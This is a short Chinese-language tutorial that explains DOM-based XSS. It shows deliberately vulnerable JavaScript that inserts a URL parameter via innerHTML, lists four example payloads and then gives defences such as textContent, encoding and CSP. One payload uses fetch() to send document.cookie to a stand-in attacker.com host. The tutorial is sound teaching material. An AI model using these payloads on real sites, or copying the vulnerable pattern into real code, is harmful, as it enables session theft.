💡 什麼是 DOM-based XSS？

DOM-based XSS 是一種完全在客戶端（瀏覽器）發生的 XSS 攻擊。 攻擊者修改 URL 參數，當 JavaScript 讀取這些參數並直接插入到 DOM 中時， 就會執行惡意腳本。

與 Reflected XSS 的差別：DOM-based XSS 不會傳送到伺服器， 完全在前端透過 JavaScript 操作 DOM 來觸發。

// 不安全的程式碼（DOM-based XSS） function showWelcome() { // 從 URL 取得參數 var params = new URLSearchParams(window.location.search); var name = params.get('name'); if (name) { // ❌ 危險！直接使用 innerHTML 插入 URL 參數 document.getElementById('welcomeMessage').innerHTML = '歡迎，' + name + '！'; } }

?name=<img src=x onerror=alert('DOM XSS')> ?name=<svg onload=alert('DOM XSS')> ?name=<script>alert(document.cookie)</script> ?name=<img src=x onerror="fetch('https://attacker.com?cookie='+document.cookie)">

🛡️ 如何防禦？

1. 使用 textContent：對於純文字，使用 textContent 而非 innerHTML

2. HTML 編碼：若必須使用 innerHTML，先進行 HTML 實體編碼

3. 驗證輸入：驗證 URL 參數的格式和內容

4. CSP 政策：設定嚴格的 Content-Security-Policy
